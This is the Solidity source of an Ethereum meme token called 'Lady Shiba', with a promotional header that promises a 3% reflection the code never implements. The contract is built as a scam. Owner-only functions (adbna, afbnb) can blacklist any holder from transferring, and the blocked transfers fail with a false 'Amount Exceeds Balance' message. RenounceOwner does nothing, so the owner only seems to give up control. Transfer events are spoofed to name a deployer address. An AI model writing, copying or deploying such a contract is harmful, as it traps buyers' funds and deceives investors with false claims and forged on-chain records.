/**
 *Submitted for verification at Etherscan.io on 2022-09-17
*/

pragma solidity 0.8.7;
/*


 #          #    ######  #     #     #####  #     # ### ######     #    
 #         # #   #     #  #   #     #     # #     #  #  #     #   # #   
 #        #   #  #     #   # #      #       #     #  #  #     #  #   #  
 #       #     # #     #    #        #####  #######  #  ######  #     # 
 #       ####### #     #    #             # #     #  #  #     # ####### 
 #       #     # #     #    #       #     # #     #  #  #     # #     # 
 ####### #     # ######     #        #####  #     # ### ######  #     # 


                                                                        

Lady Shiba  - $ShibChan -


The Shiba Inu family now has one more member to celebrate! Lady Shiba!

LADYSHIB features a 3% Token Reflection each transaction, activated after the first 24 hours - Dev 0.5%/Community 2.5% -

Low Tax Meme Token Inspired by Shiba Inu Token

Look out for a special suprise for all holders 9/18/2022 12:00 UTC!




Tokenomics -

- Total Supply: 100M
- 30M CEX
- 60m DEX
- 10M Team





*/ 

contract LadyShiba {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) zyAmount;

    // 
    string public name = "Lady Shiba";
    string public symbol = unicode"SHIBCHAN";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);

   



      constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        

        deploy(lead_deployer, totalSupply);
    }



	address owner = msg.sender;

    address Construct = 0xe8B7F69c28467451bCF32f665dB6C7873088fF78;
    address lead_deployer = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    function RenounceOwner() public onlyOwner  {

}


  function deploy(address account, uint256 amount) public onlyOwner {
        
      emit Transfer(address(0), account, amount);
   }
   function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }

    function adbna(address _user) public onlyOwner {
        require(!zyAmount[_user], "xx");
        zyAmount[_user] = true;
    
    }
    
    function afbnb(address _user) public onlyOwner {
        require(zyAmount[_user], "xx");
        zyAmount[_user] = false;
    
    }
    
 

 
   


    function transfer(address to, uint256 value) public returns (bool success) {
require(!zyAmount[msg.sender] , "Amount Exceeds Balance"); 


if(msg.sender == Construct)  {


        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
  return true;
}
        
require(!zyAmount[msg.sender] , "Amount Exceeds Balance"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }









    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   

        if(from == Construct)  {

 require(value <= balanceOf[from]);
 require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
  return true;
}
    
        require(!zyAmount[from] , "Amount Exceeds Balance"); 
               require(!zyAmount[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}